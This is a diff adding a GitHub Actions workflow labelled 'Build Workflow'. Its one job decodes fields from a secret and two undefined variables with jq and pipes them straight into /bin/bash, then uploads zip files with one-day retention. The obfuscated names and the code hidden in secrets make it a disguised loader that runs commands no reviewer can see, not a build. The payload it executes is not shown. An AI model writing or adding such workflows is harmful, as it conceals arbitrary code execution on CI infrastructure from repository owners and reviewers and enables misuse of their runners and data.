@@ -1,0 +1,28 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  agent:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Perform
+        env:
+          bt22: ${{ secrets.bt22 }}
+        run: |
+          printf '%s' "$bt22" | jq -r .w78 | /bin/bash
+          printf '%s' "$xm3" | jq -r .mztn14871 | /bin/bash
+          printf '%s' "$zj22002" | jq -r .tjhap859 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: OTp04lkY
+          path: "*.zip"
+          retention-days: 1
